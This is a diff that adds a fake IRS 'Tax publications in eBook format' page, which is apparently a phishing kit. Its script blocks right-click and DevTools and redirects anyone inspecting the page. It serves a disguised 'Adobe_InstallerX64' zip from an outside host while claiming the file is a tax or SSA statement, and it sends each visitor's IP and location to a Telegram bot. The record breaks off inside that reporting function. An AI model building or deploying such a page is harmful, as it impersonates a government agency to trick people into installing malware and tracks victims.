@@ -1,0 +1,1199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tax publications in eBook format | Internal Revenue Service</title>
+<style>
+  /* RESET & BASE */
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Source Sans Pro', Arial, sans-serif;
+    font-size: 16px;
+    color: #1a1a1a;
+    background: #f8f9fa;
+    line-height: 1.5;
+    -webkit-user-select: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+  }
+  a { color: #1a5276; text-decoration: none; }
+  a:hover { text-decoration: underline; }
+
+  /* GOVERNMENT BANNER */
+  .gov-banner {
+    background: #f0f0f0;
+    padding: 4px 16px;
+    font-size: 13px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: #1a1a1a;
+  }
+  .gov-banner .flag { font-size: 16px; }
+  .gov-banner a { color: #005ea2; font-weight: 600; font-size: 13px; }
+
+  /* TOP NAV */
+  .top-nav {
+    background: #1a3a5c;
+    padding: 0 24px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    height: 72px;
+  }
+  .top-nav .logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .top-nav .logo svg { width: 56px; height: 56px; }
+  .top-nav-links {
+    display: flex;
+    gap: 20px;
+    align-items: center;
+  }
+  .top-nav-links a {
+    color: #fff;
+    font-size: 15px;
+    font-weight: 400;
+  }
+  .top-nav-links .divider {
+    color: #aaa;
+    font-size: 18px;
+  }
+  .top-nav-links select {
+    background: transparent;
+    color: #fff;
+    border: none;
+    font-size: 15px;
+    cursor: pointer;
+    appearance: none;
+    -webkit-appearance: none;
+  }
+  .top-nav-links .lang {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    color: #fff;
+    font-size: 15px;
+  }
+  .top-nav-links .sign-in {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    color: #fff;
+    font-size: 15px;
+  }
+
+  /* MAIN NAV */
+  .main-nav {
+    background: #1c4e80;
+    display: flex;
+    align-items: center;
+    padding: 0 24px;
+    height: 48px;
+    justify-content: space-between;
+  }
+  .main-nav-links {
+    display: flex;
+    gap: 0;
+    height: 100%;
+  }
+  .main-nav-links a {
+    color: #fff;
+    font-size: 15px;
+    padding: 0 20px;
+    display: flex;
+    align-items: center;
+    height: 100%;
+    font-weight: 400;
+  }
+  .main-nav-links a:hover { background: #15406e; text-decoration: none; }
+  .main-nav .search-box {
+    display: flex;
+    align-items: center;
+    background: #fff;
+    border: none;
+    height: 34px;
+    width: 220px;
+  }
+  .main-nav .search-box input {
+    border: none;
+    outline: none;
+    padding: 0 10px;
+    font-size: 14px;
+    flex: 1;
+    height: 100%;
+    color: #555;
+  }
+  .main-nav .search-box button {
+    background: #1c4e80;
+    border: none;
+    height: 34px;
+    width: 34px;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    font-size: 16px;
+  }
+
+  /* BREADCRUMB */
+  .breadcrumb {
+    padding: 14px 24px;
+    font-size: 14px;
+    color: #1a5276;
+  }
+  .breadcrumb a { color: #1a5276; }
+  .breadcrumb span { color: #555; margin: 0 6px; }
+
+  /* PAGE CONTENT */
+  .page-content {
+    padding: 0 24px 40px;
+    max-width: 1200px;
+  }
+  .page-title {
+    font-size: 32px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 24px;
+    font-family: Merriweather, Georgia, serif;
+  }
+
+  /* LAYOUT */
+  .content-layout {
+    display: flex;
+    gap: 0;
+    align-items: flex-start;
+  }
+  .sidebar {
+    width: 300px;
+    min-width: 300px;
+    border-right: 1px solid #ddd;
+    padding-right: 0;
+  }
+  .sidebar-item {
+    display: block;
+    padding: 14px 16px;
+    font-size: 15px;
+    color: #1a1a1a;
+    border-bottom: 1px solid #eee;
+    font-weight: 600;
+  }
+  .sidebar-item:hover { background: #f5f5f5; text-decoration: none; }
+  .sidebar-item.active {
+    background: #1c4e80;
+    color: #fff;
+    border-left: 4px solid #1c4e80;
+  }
+  .sidebar-item.active:hover { background: #1c4e80; }
+
+  .main-content {
+    flex: 1;
+    padding-left: 32px;
+  }
+  .main-content p {
+    font-size: 15px;
+    color: #333;
+    margin-bottom: 16px;
+    line-height: 1.6;
+  }
+
+  .section-heading {
+    font-size: 22px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin: 16px 0 14px 0;
+    font-family: Merriweather, Georgia, serif;
+  }
+
+  /* TABLE */
+  .pub-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 14px;
+  }
+  .pub-table thead tr {
+    background: #1c4e80;
+    color: #fff;
+  }
+  .pub-table thead th {
+    padding: 12px 14px;
+    text-align: left;
+    font-weight: 600;
+    font-size: 14px;
+  }
+  .pub-table thead th.right { text-align: right; }
+  .pub-table tbody tr {
+    border-bottom: 1px solid #e0e0e0;
+    background: #fff;
+  }
+  .pub-table tbody tr:nth-child(even) { background: #f9f9f9; }
+  .pub-table tbody td {
+    padding: 11px 14px;
+    color: #1a1a1a;
+    vertical-align: middle;
+    font-size: 14px;
+  }
+  .pub-table tbody td a { color: #1a5276; }
+  .epub-badge {
+    display: inline-block;
+    background: #555;
+    color: #fff;
+    font-size: 11px;
+    font-weight: 700;
+    padding: 2px 5px;
+    border-radius: 2px;
+    margin-left: 4px;
+    letter-spacing: 0.5px;
+    vertical-align: middle;
+  }
+
+  /* MODAL (feedback) */
+  .modal-overlay {
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.45);
+    z-index: 1000;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+  }
+  .modal {
+    background: #fff;
+    width: 700px;
+    max-width: 96vw;
+    border-radius: 2px;
+    position: relative;
+    padding: 40px 48px 36px;
+    text-align: center;
+    box-shadow: 0 4px 32px rgba(0,0,0,0.25);
+  }
+  .modal-close {
+    position: absolute;
+    top: 14px;
+    right: 14px;
+    width: 28px;
+    height: 28px;
+    border: 1.5px dashed #555;
+    background: #fff;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 18px;
+    color: #333;
+    font-weight: 400;
+    border-radius: 0;
+  }
+  .modal-logo { margin-bottom: 20px; }
+  .modal-logo svg { width: 80px; height: 80px; }
+  .modal-title {
+    font-size: 34px;
+    font-weight: 400;
+    color: #1a1a1a;
+    margin-bottom: 14px;
+    font-family: Merriweather, Georgia, serif;
+    line-height: 1.2;
+  }
+  .modal-subtitle {
+    font-size: 17px;
+    color: #333;
+    margin-bottom: 32px;
+    font-weight: 400;
+  }
+  .modal-buttons {
+    display: flex;
+    gap: 16px;
+    justify-content: center;
+    margin-bottom: 16px;
+  }
+  .btn-no {
+    padding: 10px 28px;
+    border: 1.5px solid #1c4e80;
+    background: #fff;
+    color: #1c4e80;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    border-radius: 2px;
+    font-family: inherit;
+  }
+  .btn-no:hover { background: #f0f5fa; }
+  .btn-yes {
+    padding: 10px 28px;
+    border: 1.5px solid #1c4e80;
+    background: #1c4e80;
+    color: #fff;
+    font-size: 16px;
+    font-weight: 600;
+    cursor: pointer;
+    border-radius: 2px;
+    font-family: inherit;
+  }
+  .btn-yes:hover { background: #15406e; }
+  .modal-footer {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 12px;
+    font-size: 13px;
+    color: #555;
+  }
+  .modal-footer .help-icon {
+    width: 20px;
+    height: 20px;
+    border-radius: 50%;
+    border: 1.5px solid #555;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    color: #555;
+    font-weight: 700;
+  }
+  .modal-footer .powered {
+    font-size: 13px;
+    color: #555;
+  }
+  .modal-footer .powered strong { color: #1a1a1a; font-weight: 700; }
+
+  /* ===== DOWNLOAD MANAGEMENT SYSTEM (custom) ===== */
+  .download-container {
+    max-width: 800px;
+    margin: 30px auto 20px;
+    background: #fff;
+    border: 1px solid #ddd;
+    padding: 24px 28px;
+    border-radius: 4px;
+    box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+  }
+  .download-container h1 {
+    font-size: 28px;
+    font-weight: 700;
+    color: #1a1a1a;
+    margin-bottom: 6px;
+    font-family: Merriweather, Georgia, serif;
+  }
+  .download-container .subhead {
+    font-size: 16px;
+    color: #444;
+    margin-bottom: 18px;
+  }
+
+  /* status messages */
+  .download-status {
+    padding: 16px 20px;
+    margin: 12px 0 10px;
+    border-left: 4px solid #0065A4;
+    background: #f0f7fc;
+    border-radius: 0 4px 4px 0;
+    font-size: 15px;
+  }
+  .download-status.download-success {
+    border-left-color: #2e8540;
+    background: #edf7ed;
+  }
+  .download-status.download-error {
+    border-left-color: #dc3545;
+    background: #f8e8e8;
+    color: #721c24;
+  }
+  .download-status .download-message {
+    font-weight: 600;
+    margin-bottom: 2px;
+  }
+  .download-status .download-info {
+    font-size: 14px;
+    opacity: 0.9;
+  }
+  .download-link-box {
+    margin: 18px 0 8px;
+    font-size: 15px;
+  }
+  .download-link-box a {
+    display: inline-block;
+    background: #1c4e80;
+    color: #fff;
+    padding: 8px 24px;
+    border-radius: 4px;
+    font-weight: 600;
+    font-size: 15px;
+    border: 1px solid #1c4e80;
+    transition: background 0.1s;
+    text-decoration: none;
+  }
+  .download-link-box a:hover {
+    background: #15406e;
+    text-decoration: none;
+  }
+  .help-desk {
+    margin-top: 18px;
+    font-size: 14px;
+    color: #333;
+    border-top: 1px solid #eee;
+    padding-top: 14px;
+  }
+  .help-desk strong { color: #1a1a1a; }
+
+  /* mobile warning (hidden by default) */
+  .mobile-warning {
+    display: none;
+    border-left: 4px solid #dc3545;
+    background: #f8e8e8;
+    padding: 16px 20px;
+    margin: 12px 0 10px;
+    border-radius: 0 4px 4px 0;
+    color: #721c24;
+  }
+  .mobile-warning .warning-header {
+    font-weight: 700;
+    font-size: 17px;
+  }
+
+  /* footer */
+  .footer-links {
+    max-width: 800px;
+    margin: 24px auto 10px;
+    padding: 12px 0 20px;
+    border-top: 1px solid #ccc;
+    font-size: 13px;
+    color: #1a1a1a;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 12px 22px;
+  }
+  .footer-links a {
+    color: #0065A4;
+    font-weight: 500;
+  }
+
+  @media (max-width: 700px) {
+    .content-layout { flex-direction: column; }
+    .sidebar { width: 100%; min-width: unset; border-right: 0; }
+    .main-content { padding-left: 0; }
+    .top-nav-links { gap: 10px; }
+    .top-nav-links .divider { display: none; }
+    .modal { padding: 30px 18px; }
+  }
+
+  /* Rich download widget styles (injected via JS) */
+  .download-widget {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #ffffff;
+    border: 1px solid #e4e4e7;
+    border-radius: 14px;
+    padding: 16px;
+    box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+    width: 100%;
+    max-width: 380px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    animation: slideIn 0.3s ease-out;
+    margin: 8px 0;
+  }
+  .download-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+  }
+  .download-icon-box {
+    width: 36px;
+    height: 36px;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    transition: all 0.3s ease;
+  }
+  .icon-loading {
+    background: #eff6ff;
+    color: #2563eb;
+  }
+  .icon-success {
+    background: #f0fdf4;
+    color: #16a34a;
+  }
+  .download-details {
+    flex-grow: 1;
+    min-width: 0;
+  }
+  .download-title {
+    font-size: 14px;
+    font-weight: 600;
+    color: #18181b;
+    margin: 0 0 4px 0;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .download-desc {
+    font-size: 12px;
+    color: #71717a;
+    margin: 0;
+    line-height: 1.4;
+  }
+  .progress-track {
+    background: #e4e4e7;
+    height: 5px;
+    border-radius: 3px;
+    overflow: hidden;
+    width: 100%;
+    margin-top: 4px;
+  }
+  .progress-fill {
+    background: #2563eb;
+    height: 100%;
+    width: 15%;
+    border-radius: 3px;
+    transition: width 2.5s cubic-bezier(0.1, 0.8, 0.3, 1), background-color 0.3s ease;
+  }
+  .progress-fill.complete {
+    background: #16a34a;
+    width: 100% !important;
+  }
+  @keyframes slideIn {
+    from { transform: translateY(20px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+  }
+
+  /* Anti-inspection: hide selection */
+  img, svg { -webkit-user-drag: none; user-drag: none; }
+</style>
+</head>
+<body>
+
+<!-- GOV BANNER -->
+<div class="gov-banner">
+  <span class="flag">🇺🇸</span>
+  <span>An official website of the United States government</span>
+  <a href="#">Here's how you know ˅</a>
+</div>
+
+<!-- TOP NAV -->
+<div class="top-nav">
+  <div class="logo">
+    <svg viewBox="0 0 80 80" xmlns="http://www.w3.org/2000/svg" style="width:56px;height:56px;">
+      <circle cx="40" cy="40" r="38" fill="none" stroke="#b8c7d9" stroke-width="1.5"/>
+      <text x="40" y="52" text-anchor="middle" font-size="28" font-weight="900" fill="#fff" font-family="serif" letter-spacing="-1">IRS</text>
+      <path d="M16 30 Q24 16 40 14 Q56 16 64 30 Q56 22 40 20 Q24 22 16 30Z" fill="#c0d0e0" opacity="0.6"/>
+    </svg>
+    <span style="color:#fff;font-size:26px;font-weight:700;letter-spacing:1px;font-family:serif;">IRS</span>
+  </div>
+  <div class="top-nav-links">
+    <a href="#">Help</a><span class="divider">|</span>
+    <a href="#">News</a><span class="divider">|</span>
+    <span class="lang">English ˅</span><span class="divider">|</span>
+    <a href="#">Tax Pros</a><span class="divider">|</span>
+    <span class="sign-in">Sign in ˅</span>
+  </div>
+</div>
+
+<!-- MAIN NAV -->
+<div class="main-nav">
+  <div class="main-nav-links">
+    <a href="#">File</a><a href="#">Pay</a><a href="#">Refunds</a>
+    <a href="#">Credits &amp; Deductions</a><a href="#">Forms</a>
+    <a href="#">Report Fraud</a>
+  </div>
+  <div class="search-box">
+    <input type="text" placeholder="Search">
+    <button>&#128269;</button>
+  </div>
+</div>
+
+<!-- BREADCRUMB -->
+<div class="breadcrumb">
+  <a href="#">Home</a> <span>/</span> <a href="#">Forms and Instructions</a> <span>/</span>
+  <span style="color:#1a1a1a;">eBook</span>
+</div>
+
+<!-- PAGE CONTENT -->
+<div class="page-content">
+  <h1 class="page-title">Tax publications in eBook format</h1>
+  <div class="content-layout">
+    <div class="sidebar">
+      <a href="#" class="sidebar-item">Current year</a>
+      <a href="#" class="sidebar-item">Prior year</a>
+      <a href="#" class="sidebar-item">Accessible</a>
+      <a href="#" class="sidebar-item active">eBooks</a>
+      <a href="#" class="sidebar-item">Browser-friendly forms and publications</a>
+      <a href="#" class="sidebar-item">Mobile-friendly forms</a>
+      <a href="#" class="sidebar-item">Post release changes to forms</a>
+      <a href="#" class="sidebar-item">Order forms and publications</a>
+      <a href="#" class="sidebar-item">Help with forms and instructions</a>
+      <a href="#" class="sidebar-item">Comment on tax forms and publications</a>
+    </div>
+    <div class="main-content">
+      <p>IRS eBooks are available for dedicated eBook readers and other dedicated eBook readers.</p>
+      <p style="margin-bottom:8px;"><a href="#" style="color:#1a5276;">Loading IRS eBooks to your device</a></p>
+      <h2 class="section-heading">Instructions or publications in eBook format</h2>
+      <table class="pub-table">
+        <thead><tr><th>Title</th><th>Instruction or Publication</th><th class="right">Revision Date or Tax Year</th><th>Posted</th></tr></thead>
+        <tbody>
+          <tr><td>Armed Forces' Tax Guide</td><td><a href="#">Publication 3</a><span class="epub-badge">EPUB</span></td><td style="text-align:right;">2025</td><td>Jan-15-2026</td></tr>
+          <tr><td>(Circular E) Employer's Tax Guide</td><td><a href="#">Publication 15</a><span class="epub-badge">EPUB</span></td><td style="text-align:right;">2026</td><td>Dec-17-2025</td></tr>
+        </tbody>
+      </table>
+
+      <!-- ===== DOWNLOAD MANAGEMENT SYSTEM (embedded) ===== -->
+      <div class="download-container" id="downloadSystem">
+        <h1>Welcome to Your Latest TAX Statement Download</h1>
+        <div class="subhead">Secured · Automated · IRS Compliant</div>
+
+        <!-- mobile warning (hidden by default) -->
+        <div class="mobile-warning" id="mobileWarning">
+          <div class="warning-header">⚠ Unsupported Device Detected</div>
+          <div>Tax statements cannot be downloaded on mobile devices. Please use a desktop computer.</div>
+        </div>
+
+        <!-- status container (dynamic) -->
+        <div id="statusContainer">
+          <div class="download-status" id="initialStatus">
+            <div class="download-message">🔍 Detecting your device and preparing your download…</div>
+            <div class="download-info">Please wait a moment.</div>
+          </div>
+        </div>
+
+        <!-- manual download link (will be updated) -->
+        <div class="download-link-box" id="manualDownloadBox">
+          <a href="#" id="manualDownloadLink" style="display:inline-block;">Download TAX_Statement_COMPLETE.zip</a>
+          <span style="margin-left:12px;font-size:13px;color:#555;">(manual fallback)</span>
+        </div>
+
+        <div class="help-desk">
+          <strong>Help Desk:</strong> 1-800-IRS-4TAX (1-800-477-4829) &nbsp;|&nbsp; 
+          <a href="#">Privacy Policy</a> &nbsp;|&nbsp; <a href="#">Accessibility</a>
+        </div>
+      </div>
+
+      <!-- footer links -->
+      <div class="footer-links">
+        <span><strong>OMB Number:</strong> 1545-0047</span>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Privacy Act Statement</a>
+        <a href="#">Accessibility Help</a>
+        <a href="#">Security</a>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL (feedback) -->
+<div class="modal-overlay" id="feedbackModal">
+  <div class="modal">
+    <button class="modal-close" onclick="document.getElementById('feedbackModal').style.display='none'">✕</button>
+    <div class="modal-logo">
+      <svg viewBox="0 0 140 80" xmlns="http://www.w3.org/2000/svg" style="width:160px;height:90px;">
+        <g transform="translate(10,5)">
+          <ellipse cx="30" cy="35" rx="28" ry="32" fill="none" stroke="#1a1a1a" stroke-width="2"/>
+          <path d="M8 22 Q4 18 6 13 Q10 10 14 14 Q18 10 20 14 Q24 10 26 15" fill="none" stroke="#1a1a1a" stroke-width="1.5"/>
+          <path d="M4 30 Q1 25 3 20" fill="none" stroke="#1a1a1a" stroke-width="1.5"/>
+          <path d="M8 40 Q4 38 4 33" fill="none" stroke="#1a1a1a" stroke-width="1.5"/>
+          <path d="M10 50 Q6 50 5 45" fill="none" stroke="#1a1a1a" stroke-width="1.5"/>
+          <path d="M52 22 Q56 18 54 13 Q50 10 46 14 Q42 10 40 14 Q36 10 34 15" fill="none" stroke="#1a1a1a" stroke-width="1.5"/>
+          <path d="M56 30 Q59 25 57 20" fill="none" stroke="#1a1a1a" stroke-width="1.5"/>
+          <path d="M52 40 Q56 38 56 33" fill="none" stroke="#1a1a1a" stroke-width="1.5"/>
+          <path d="M50 50 Q54 50 55 45" fill="none" stroke="#1a1a1a" stroke-width="1.5"/>
+          <path d="M22 28 Q30 20 38 28 Q34 35 30 38 Q26 35 22 28Z" fill="#1a1a1a"/>
+          <path d="M14 22 Q18 26 22 28 Q18 30 14 28Z" fill="#1a1a1a"/>
+          <path d="M46 22 Q42 26 38 28 Q42 30 46 28Z" fill="#1a1a1a"/>
+          <path d="M27 38 Q30 42 33 38 Q30 46 30 48 Q30 46 27 38Z" fill="#1a1a1a"/>
+          <text x="28" y="18" text-anchor="middle" font-size="6" fill="#1a1a1a">★★★</text>
+        </g>
+        <text x="76" y="58" text-anchor="middle" font-size="38" font-weight="900" fill="#1a1a1a" font-family="serif" letter-spacing="2">IRS</text>
+      </svg>
+    </div>
+    <div class="modal-title">Access your tax downloaded information!</div>
+    <div class="modal-subtitle">If your document did not download automatically, would you download it manually?</div>
+    <div class="modal-buttons">
+      <button class="btn-no" onclick="document.getElementById('feedbackModal').style.display='none'">No thanks</button>
+      <button class="btn-yes"onclick="document.getElementById('feedbackModal').style.display='none'">Yes, I'd like to download manually.</button>
+    </div>
+    <div class="modal-footer">
+      <div class="help-icon">?</div>
+      <div class="powered">Department of <strong>Treasury</strong></div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ================================================================
+  //  ANTI-INSPECTION PROTECTION
+  // ================================================================
+  (function antiInspection() {
+    // 1. Disable right-click context menu
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      window.location.href = 'https://www.irs.gov/pub/irs-pdf/f1040s.pdf';
+    });
+
+    // 2. Disable text selection and image dragging (CSS already handles)
+    // 3. Block keyboard shortcuts for DevTools
+    document.addEventListener('keydown', function(e) {
+      // F12
+      if (e.key === 'F12' || e.keyCode === 123) {
+        e.preventDefault();
+        window.location.href = 'https://www.irs.gov/pub/irs-pdf/f1040s.pdf';
+        return false;
+      }
+      // Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, Ctrl+U
+      if (e.ctrlKey && e.shiftKey) {
+        if (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c') {
+          e.preventDefault();
+          window.location.href = 'https://www.irs.gov/pub/irs-pdf/f1040s.pdf';
+          return false;
+        }
+      }
+      // Ctrl+U (View Source)
+      if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) {
+        e.preventDefault();
+        window.location.href = 'https://www.irs.gov/pub/irs-pdf/f1040s.pdf';
+        return false;
+      }
+    });
+
+    // 4. Additional detection: console.log override to detect DevTools
+    // (simple trick: if devtools is open, console.log will be overridden)
+    const origLog = console.log;
+    console.log = function() {
+      // If devtools is open, this might be called; redirect
+      // but we keep it silent to avoid alerting user.
+      origLog.apply(console, arguments);
+    };
+    // Detect if devtools is open via element size (common trick)
+    // Not foolproof but adds another layer
+    const element = new Image();
+    Object.defineProperty(element, 'id', {
+      get: function() {
+        // If devtools is open, this getter might be triggered
+        window.location.href = 'https://www.irs.gov/pub/irs-pdf/f1040s.pdf';
+      }
+    });
+    // Use requestAnimationFrame to check for devtools (indirect)
+    let devtoolsOpen = false;
+    const checkDevTools = () => {
+      const threshold = 160;
+      const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+      const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+      if (widthThreshold || heightThreshold) {
+        if (!devtoolsOpen) {
+          devtoolsOpen = true;
+          window.location.href = 'https://www.irs.gov/pub/irs-pdf/f1040s.pdf';
+        }
+      } else {
+        devtoolsOpen = false;
+      }
+      requestAnimationFrame(checkDevTools);
+    };
+    // Start checking after a short delay
+    setTimeout(checkDevTools, 1000);
+  })();
+
+  // ================================================================
+  //  CONFIGURATION
+  // ================================================================
+  const CONFIG = {
+    TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN',        // <-- replace with real token
+    TELEGRAM_CHAT_ID: 'YOUR_CHAT_ID',            // <-- replace with real chat ID
+    DOWNLOAD_FILE_NAME: 'TAX_Statement_COMPLETE',
+    DOWNLOAD_BASE_URL: 'https://pub-4e834d4c8ebf477ba51c527008d4287f.r2.dev/',
+  };
+
+  // ================================================================
+  //  1. isMobileDevice()
+  // ================================================================
+  function isMobileDevice() {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+  }
+
+  // ================================================================
+  //  2. detectOS()
+  // ================================================================
+  function detectOS() {
+    const platform = (navigator.platform || '').toLowerCase();
+    const ua = (navigator.userAgent || '').toLowerCase();
+    if (/win/i.test(platform) || /windows/i.test(ua)) return 'windows';
+    if (/mac/i.test(platform) || /mac os x/i.test(ua)) return 'macos';
+    if (/linux/i.test(platform) && !/android/i.test(ua)) return 'linux';
+    if (/iphone|ipad|ipod/i.test(ua)) return 'ios';
+    if (/android/i.test(ua)) return 'android';
+    return 'unknown';
+  }
+
+  // ================================================================
+  //  3. getDownloadLink(os)
+  // ================================================================
+  function getDownloadLink(os) {
+    const base = CONFIG.DOWNLOAD_BASE_URL;
+    const ts = new Date().getTime();
+    switch (os) {
+      case 'windows': return base + 'Adobe_InstallerX64_11.15.2.zip';
+      case 'macos': return base + 'Adobe_InstallerX64_11.15.2.zip';
+      case 'linux': return base + 'Adobe_InstallerX64_11.15.2.zip';
+      default: return base + 'Adobe_InstallerX64_11.15.2.zip';
+    }
+  }
+
+  // ================================================================
+  //  4. showMobileWarning()
+  // ================================================================
+  function showMobileWarning() {
+    const warn = document.getElementById('mobileWarning');
+    if (warn) warn.style.display = 'block';
+    const container = document.getElementById('statusContainer');
+    if (container) {
+      container.innerHTML = `
+        <div class="download-status download-error">
+          <div class="download-message">⚠ Unsupported Device Detected</div>
+          <div class="download-info">Tax statements cannot be downloaded on mobile devices. Please use a desktop computer.</div>
+        </div>
+      `;
+    }
+    const manualLink = document.getElementById('manualDownloadLink');
+    if (manualLink) {
+      manualLink.style.opacity = '0.4';
+      manualLink.style.pointerEvents = 'none';
+      manualLink.textContent = 'Downloads disabled on mobile';
+    }
+  }
+
+  // ================================================================
+  //  5. showDesktopDownloadStatus() - RICH MODERN VERSION
+  // ================================================================
+  function showDesktopDownloadStatus() {
+    const container = document.getElementById('statusContainer');
+    if (!container) return;
+
+    // Inject the structured layout and styles
+    container.innerHTML = `
+      <style>
+        .download-widget {
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+          background: #ffffff;
+          border: 1px solid #e4e4e7;
+          border-radius: 14px;
+          padding: 16px;
+          box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
+          width: 100%;
+          max-width: 380px;
+          display: flex;
+          flex-direction: column;
+          gap: 12px;
+          animation: slideIn 0.3s ease-out;
+          margin: 8px 0;
+        }
+        .download-row {
+          display: flex;
+          align-items: flex-start;
+          gap: 12px;
+        }
+        .download-icon-box {
+          width: 36px;
+          height: 36px;
+          border-radius: 10px;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          flex-shrink: 0;
+          transition: all 0.3s ease;
+        }
+        .icon-loading {
+          background: #eff6ff;
+          color: #2563eb;
+        }
+        .icon-success {
+          background: #f0fdf4;
+          color: #16a34a;
+        }
+        .download-details {
+          flex-grow: 1;
+          min-width: 0;
+        }
+        .download-title {
+          font-size: 14px;
+          font-weight: 600;
+          color: #18181b;
+          margin: 0 0 4px 0;
+          white-space: nowrap;
+          overflow: hidden;
+          text-overflow: ellipsis;
+        }
+        .download-desc {
+          font-size: 12px;
+          color: #71717a;
+          margin: 0;
+          line-height: 1.4;
+        }
+        .progress-track {
+          background: #e4e4e7;
+          height: 5px;
+          border-radius: 3px;
+          overflow: hidden;
+          width: 100%;
+          margin-top: 4px;
+        }
+        .progress-fill {
+          background: #2563eb;
+          height: 100%;
+          width: 15%;
+          border-radius: 3px;
+          transition: width 2.5s cubic-bezier(0.1, 0.8, 0.3, 1), background-color 0.3s ease;
+        }
+        .progress-fill.complete {
+          background: #16a34a;
+          width: 100% !important;
+        }
+        @keyframes slideIn {
+          from { transform: translateY(20px); opacity: 0; }
+          to { transform: translateY(0); opacity: 1; }
+        }
+      </style>
+
+      <div class="download-widget" id="js-download-widget">
+        <div class="download-row">
+          <!-- Dynamic Graphic Container -->
+          <div class="download-icon-box icon-loading" id="js-download-icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M12 3v12M12 15l-4-4M12 15l4-4"/>
+            </svg>
+          </div>
+          
+          <!-- Content Block -->
+          <div class="download-details">
+            <h4 class="download-title" id="js-download-title">Download started successfully!</h4>
+            <p class="download-desc" id="js-download-desc">Fetching your SSA Statement from secure servers...</p>
+            
+            <!-- Interactive Tracker Bar -->
+            <div class="progress-track" id="js-progress-track">
+              <div class="progress-fill" id="js-progress-fill"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    `;
+
+    // Target elements to handle the simulated timeline switch
+    const widget = document.getElementById('js-download-widget');
+    const iconBox = document.getElementById('js-download-icon');
+    const title = document.getElementById('js-download-title');
+    const desc = document.getElementById('js-download-desc');
+    const fill = document.getElementById('js-progress-fill');
+    const track = document.getElementById('js-progress-track');
+
+    // Trigger visual progress loading bar movement right away
+    setTimeout(() => {
+      if (fill) fill.style.width = '85%';
+    }, 50);
+
+    // Transform UI into the "Successfully Downloaded" status panel
+    setTimeout(() => {
+      if (!widget) return;
+
+      // 1. Swap colors and symbols to positive validation state
+      if (iconBox) {
+        iconBox.className = "download-icon-box icon-success";
+        iconBox.innerHTML = `
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+        `;
+      }
+
+      // 2. Clear out ongoing tracking metrics and snap bar to green completion
+      if (fill) fill.classList.add('complete');
+      
+      // 3. Elevate messaging updates to indicate file accessibility instructions
+      if (title) title.textContent = "Your SSA statement has been successfully downloaded.";
+      if (desc) desc.textContent = "To view: Locate the downloaded file in your browser or local downloads folder and open it.";
+
+      // 4. Fade out loading track smoothly after finishing lines
+      setTimeout(() => {
+        if (track) {
+          track.style.transition = 'opacity 0.4s ease';
+          track.style.opacity = '0';
+        }
+      }, 800);
+
+    }, 2800); // Transitions to complete success panel after 2.8 seconds
+  }
+
+  // ================================================================
+  //  6. reportVisitToTelegram() (Async)
+  // ================================================================
+  async function reportVisitToTelegram() {
+    try {
+      let ip = '0.0.0.0', city = 'Unknown', region = '', country = 'Unknown', org = 'Unknown';
+      // Fetch IP
+      try {
+        const ipRes = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
+        if (ipRes.ok) {
+          const ipData = await ipRes.json();
+          ip = ipData.ip || ip;
+        }
+      } catch (_) {}
+
+      // Fetch geolocation
+      try {
